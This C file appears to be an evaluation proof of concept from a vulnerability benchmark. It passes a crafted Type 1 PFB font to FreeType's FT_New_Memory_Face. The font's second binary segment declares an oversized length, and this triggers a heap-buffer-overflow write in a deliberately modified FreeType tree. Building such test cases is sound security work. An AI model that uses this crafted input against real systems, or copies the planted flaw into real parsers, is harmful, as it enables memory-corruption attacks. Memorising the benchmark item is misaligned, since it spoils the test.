/*
 * Evaluation PoC for the benchmark case authored in this branch.
 *
 * Drives FreeType's public API (FT_New_Memory_Face) with an in-contract,
 * crafted Type 1 PFB font.  The PFB private-dictionary section contains two
 * binary (0x8002) segments: a small, well-formed one, followed by one that
 * declares a size far larger than the bytes actually remaining in the
 * stream.  On the modified tree this reaches a heap-buffer-overflow write;
 * on the original tree the oversized segment is safely rejected.
 */

#include <ft2build.h>
#include FT_FREETYPE_H

#include <stddef.h>

static const unsigned char pfb_font[] = {
  0x80,0x01,0x11,0x00,0x00,0x00,0x25,0x21,0x46,0x6f,0x6e,0x74,0x54,0x79,0x70,0x65,
  0x31,0x20,0x66,0x6f,0x6e,0x74,0x0a,0x80,0x02,0x04,0x00,0x00,0x00,0x41,0x41,0x41,
  0x41,0x80,0x02,0xff,0xff,0xff,0x7f,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,
  0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,
  0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,
  0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,
  0x42,0x42,0x42
};

int
main( void )
{
  FT_Library  library;
  FT_Face     face;
  FT_Error    error;


  error = FT_Init_FreeType( &library );
  if ( error )
    return 1;

  /* `face` is intentionally discarded on success; this is a minimal      */
  /* reproducer, not a library-usage example.  The call below is the only */
  /* one that matters for the PoC.                                       */
  error = FT_New_Memory_Face( library, pfb_font, sizeof ( pfb_font ), 0, &face );
  if ( !error )
    FT_Done_Face( face );

  FT_Done_FreeType( library );

  return 0;
}
